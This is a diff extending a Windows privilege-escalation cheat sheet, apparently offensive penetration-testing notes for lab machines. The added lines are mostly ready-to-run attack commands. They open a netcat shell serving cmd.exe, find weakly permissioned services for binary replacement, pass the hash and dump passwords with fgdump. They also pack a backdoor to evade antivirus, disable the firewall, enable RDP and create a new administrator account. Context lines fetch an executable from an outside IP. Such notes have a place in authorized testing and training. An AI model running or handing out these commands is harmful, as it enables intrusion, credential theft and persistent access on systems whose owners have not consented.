@@ -1,5 +1,11 @@
 *Windows elevation of privileges*narrative
 Windows elevation of privileges
+    Getting a shell
+    *$ system(“start cmd.exe /k $cmd”)*
+
+    Getting a reverse shell
+    *$ nc -Lp 31337 -vv -e cmd.exe*
+
     Find installed patches, architecture, OS version
     *$ systeminfo*
 
@@ -30,6 +36,19 @@ netsh firewall show config*
 
     List windows services
     *$ net start*
+    *$ wmic service list brief*
+    Get permisions of all services. Services with full access from *BUILTIN\Users* can replace executable with malicious binary.
+    *$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"*
+
+    Pass the hash
+    *$ pth-winexe -U hash //IP cmd*
+
+    Dump passwords
+    *$ fgdump.exe*
+
+    If powershell is blocked, you can download:
+    *https://github.com/Ben0xA/nps*
 
     Downloading files in Windows:
     *(new-object System.Net.WebClient).DownloadFile('http://1.1.1.1/file.exe','C:\Users\Administrator\Desktop\file.exe')*
@@ -42,6 +61,10 @@ netsh firewall show config*
 [+] relevant kbs [‘3164038’, ‘3163018’, ‘3163017’, ‘3161561’]
 [*] done*
 
+
+AV bypass
+    Av byPass
+    *$ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe*
 
 Metasploit
     Module to elevate privileges to SYSTEM by creating a service or hijacking existing ones with incorrect permissions
@@ -90,3 +113,20 @@ Update & exploits
 7132       Service Code Exec     MS08-067    SP4          -          SP2       -            -          -
 14674      SRV2.SYS SMB          MS09-050    -           -           -         -            SP1/2      -*
 
+Useful commands
+    Enable RDP access
+    *reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable*
+
+    Disable firewall
+    *$ netsh firewall set opmode disable*
+
+    Add a new user
+    *$ net user test 1234 /add
+net localgroup administrators test /add*
+
+
+
+Get proof
+    *$ echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: & type "C:\Users\Administrator\Desktop\proof.txt" 2> nul & type "C:\Documents and Settings\Administrator\Desktop\proof.txt" 2> nul & type %USERPROFILE%\Desktop\proof.txt 2> null*
